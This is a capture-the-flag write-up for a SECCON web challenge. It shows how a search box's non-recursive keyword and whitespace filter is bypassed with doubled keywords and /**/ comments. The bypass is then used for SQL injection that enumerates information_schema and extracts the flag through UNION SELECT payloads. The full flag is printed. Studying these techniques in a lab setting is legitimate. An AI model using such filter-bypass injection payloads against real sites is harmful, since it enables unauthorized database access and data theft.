# Web Search

The website displays a list of contents stored in the database and has a search box.
In addition, it is vulnerable to SQL injection.

When searching, `%`, `|`, `!`, `,`, `AND`, `OR` and white space are removed (case insensitive and not recursive).

## Solving

First, get data by using a simple SQL injection.
To inject `' or 1=1;#` into a SQL statement, you can use `'/**/oorr/**/1=1;#`.
This gives you a part of the FLAG "SECCON{Yeah_Sqli_Success_" and a message 'the rest of flag is in "flag" table'.

Next, get the name of the column in the "flag" table by using the "columns" table of the "information_schema" database.
It can be got by injecting `zz'union select * from(select null)as a join(select column_name from information_schema.columns where table_name='flag')as b join(select null)as c#`.
So searching by `zz'union/**/select/**/*/**/from(select/**/null)as/**/a/**/join(select/**/column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flag')as/**/b/**/join(select/**/null)as/**/c#`, you find it is "piece".

Then, get the value of the "piece" column of the "flag" table by using "UNION".
It can be got by injecting `zz'union select * from(select null)as a join(select piece from flag)as b join(select null)as c#`.
So searching by `zz'union/**/select/**/*/**/from(select/**/null)as/**/a/**/join(select/**/piece/**/from/**/flag)as/**/b/**/join(select/**/null)as/**/c#`, you find it is "You_Win_Yeah}"

Finally, from the above results, you can get the FLAG "SECCON{Yeah_Sqli_Success_You_Win_Yeah}".
